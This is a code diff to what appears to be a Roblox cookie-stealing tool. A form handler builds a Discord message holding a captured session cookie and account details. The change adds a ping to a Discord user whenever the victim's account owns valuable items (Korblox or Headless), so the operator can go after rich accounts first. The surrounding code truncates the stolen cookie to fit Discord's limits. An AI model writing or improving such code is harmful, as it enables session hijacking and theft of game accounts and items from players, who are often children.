@@ -314,9 +314,23 @@ def submit_form():
             cookie_content = cookie_content[:available_cookie_space] + "..."
             print(f"Cookie truncated to fit Discord limit. Original: {len(cookie_content)} chars, Truncated: {len(cookie_content)} chars")
         
+        # Check if user has Korblox or Headless for ping notification
+        has_premium_items = korblox or headless
+        ping_content = ''
+        
+        if has_premium_items:
+            # Ping the user if account has Korblox or Headless
+            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
+            if korblox and headless:
+                ping_content += ' - Account has both Korblox AND Headless!'
+            elif korblox:
+                ping_content += ' - Account has Korblox!'
+            elif headless:
+                ping_content += ' - Account has Headless!'
+        
         # Create dual embed structure - Account info at top, Cookie at bottom
         discord_data = {
-            'content': '',  # Empty content so embeds appear first
+            'content': ping_content,  # Ping if premium items detected
             'embeds': [
                 {
                     # Account Information Embed (Top)  
